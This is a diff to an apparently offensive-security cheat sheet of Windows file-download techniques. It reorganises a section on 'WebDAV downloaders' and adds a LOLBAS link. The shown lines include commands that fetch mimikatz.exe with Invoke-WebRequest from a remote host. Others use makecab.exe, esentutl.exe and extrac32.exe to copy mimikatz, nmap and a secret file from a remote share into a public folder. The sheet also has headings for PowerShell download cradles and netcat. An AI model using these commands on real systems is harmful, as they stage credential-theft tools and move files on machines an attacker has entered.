@@ -16,11 +16,7 @@ Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mi
 
 ### powershell download cradles
 
-by @harmj0y
-
-Links:
-
-https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+from @harmj0y
 
 
 #### powershell 3.0+ download and execute (bypass IE firstrun check)
@@ -124,20 +120,27 @@ Links:
 
 https://twitter.com/Oddvarmoe/status/984749424395112448
 
+## WebDAV downloaders
 
-## makecab.exe
+### makecab.exe
 
 C:\Windows\System32\makecab.exe \\10.10.10.10\share\nmap.zip C:\Users\Public\nmap.cab
 
 
-## esentutl.exe
+### esentutl.exe
 
 C:\Windows\System32\esentutl.exe /y "\\10.10.10.10\share\mimikatz_trunk.zip" /d"C:\Users\Public\mimikatz_trunk.zip" /o
 
 
-## extrac32.exe
+### extrac32.exe
 
 C:\Windows\System32\extrac32.exe /Y /C \\10.10.10.10\share\secret.txt C:\Users\Public\secret.txt
+
+
+Links:
+
+for fuller list of WebDAV downloader LOLBINS see:
+https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
 
 
 ## netcat
